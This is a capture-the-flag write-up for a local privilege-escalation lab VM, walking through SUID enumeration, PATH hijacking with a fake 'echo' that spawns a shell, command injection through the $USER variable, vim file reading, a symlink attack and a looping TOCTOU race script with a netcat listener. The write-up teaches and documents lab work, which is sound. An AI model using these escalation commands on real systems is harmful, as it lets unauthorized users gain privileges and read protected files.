# AC_1 — Access Control

---

## Problem description

An ISO to import into a VM. One non-obvious setup detail: it has to be imported as **"Oracle Linux (32-bit)"**, or you get a kernel panic at boot. Each level hands you `levelNN:levelNN` credentials; the goal is to become the `flagNN` user (who owns the flag file) by exploiting a badly configured binary or permission.

## AC_1.01 — Bootstrap

Environment check, no exploit: the flag is printed on the splash screen / initial terminal output as soon as the VM boots. It only confirms the machine runs.

```
Flag: CCIT{****************}
```

## AC_1.02 — Set User ID (SUID)

Credentials `level00:level00`. Concept: a binary with the **SUID** bit runs with the privileges of the *file owner*, not of whoever launches it. I look for SUID binaries owned by `flag00`:

```bash
find / -user flag00 -perm /u+s 2>/dev/null
```

- `-user flag00`: files owned by the target user
- `-perm /u+s`: SUID bit set
- `2>/dev/null`: drop the "Permission denied" noise

It returns `/usr/share/nano/fishy` (tucked into an unsuspicious folder). Running it prints the flag. At the end it shows `1000 1001 1001`: those are **RUID** (level00=1000), **EUID** (flag00=1001) and **GID**. It's the EUID at 1001 that lets it read flag00's secret. The register that matters is the middle one.

```
Flag: CCIT{****************}
```

## AC_1.03 — PATH Hijacking

Credentials `level01:level01`. The binary `/home/flag01/flag01` calls a system command (like `echo`) **without an absolute path**. When a SUID program invokes `echo` instead of `/bin/echo`, the shell searches the `$PATH` directories in order: if I put my own malicious `echo` in a directory that comes first, mine runs, with flag01's privileges.

```bash
cd /tmp
echo "/bin/sh" > echo      # my fake "echo" spawns a shell
chmod +x echo
export PATH=/tmp:$PATH      # /tmp before everything else
/home/flag01/flag01        # now "echo" = my shell, as flag01
```

I get a shell as flag01 and read the flag.

```
Flag: CCIT{****************}
```

## AC_1.04 — Command Execution (Env Injection)

Credentials `level02:level02`. The binary uses the `$USER` variable inside a `system()` / `popen()`, concatenating it into a command string without sanitizing it. If I slip a `;` into the variable, I close the original command and add my own:

```bash
export USER=';cat /home/flag02/flag.txt'
/home/flag02/flag02
```

The `;` breaks the string and `cat` runs with the binary's SUID privileges. Command injection through an environment variable.

```
Flag: CCIT{****************}
```

## AC_1.05 — Exit VIM (GTFOBins)

Credentials `level03:level03`. Here the level drops you into a vim-like interface with the wrong permissions. vim isn't "just" an editor: it can read arbitrary files and spawn shells (a GTFOBins classic). From the editor:

```
:e /home/flag03/
```

Browse the directory, open the flag file and read it directly inside the editor, with whatever privileges vim is running as.

```
Flag: CCIT{****************}
```

## AC_1.06 — Read Flag (Symlink Attack)

Credentials `level04:level04`. The `flag04` binary reads the file you pass as an argument, but it does so with flag04's privileges. I can't read `flag.txt` myself, but I can hand it a **symbolic link** and pass that: it follows the link and reads the protected file on my behalf.

```bash
cd /home/level04
ln -s /home/flag04/flag.txt fintoFile
/home/flag04/flag04 /home/level04/fintoFile
```

```
Flag: CCIT{****************}
```

## AC_1.07 — TOCTOU (Time-of-Check to Time-of-Use)

Credentials `level05:level05`. The toughest one. The `flag05` binary **first checks** that the file you pass is legitimate (check), **then reads/sends it** (use). Between the two moments there's a window: if in that gap I swap the file for a link to the flag, the check passes on a harmless file but the read happens on the flag. It's a **race condition**, so it has to be hammered in a loop until the two moments line up the way I want.

```bash
mkdir -p /tmp/hax; cd /tmp/hax

# 2. Cleanup (crucial: kill leftover background jobs from earlier tries)
kill $(jobs -p) 2>/dev/null; rm -f exploit out myfile; echo "test" > myfile; chmod 644 myfile

# 3. Listener
(while true; do nc -l -p 18211 >> out; done) &

# 4. Symlink swapper: alternate good file / flag in a loop
(while true; do ln -sfn myfile exploit; ln -sfn /home/flag05/flag.txt exploit; done) &

# 5. The binary in a loop
(while true; do /home/flag05/flag05 /tmp/hax/exploit 127.0.0.1 >/dev/null 2>&1; done) &

# 6. Wait for the race to hit
tail -f out | grep --color=always "CCIT"
```

It took around 6 to 7 attempts to hit the race window. I was initially stuck and reached out to the tutor to verify if my script was correct: they confirmed the logic was sound and explained that it's purely a matter of timing and luck—it might land on the first try or take 20+ attempts depending on CPU scheduling. Running it continuously eventually yielded the flag.

```
Flag: CCIT{****************}
```

## What I learned

- SUID = run as the file owner, not as your user. `find / -perm /u+s -user flagNN` is the first thing to launch on any box: it lists the attack surface in one line. And the binaries hide in innocent folders (`/usr/share/nano/fishy`).
- A command invoked without an absolute path inside a SUID binary is an open door: I control `$PATH`, so I decide which `echo` runs.
- `$USER`, `$HOME` and friends aren't trusted data: if they end up in an unsanitized `system()`, a single `;` is enough for injection. Env vars are user input, full stop.
-Symlink and TOCTOU share the same underlying concept (feeding a path you control to a privileged process), but TOCTOU introduces a timing factor: the exploit isn't deterministic and heavily relies on process scheduling, meaning it might succeed instantly or require dozens of repeated attempts before hitting the exact race window.
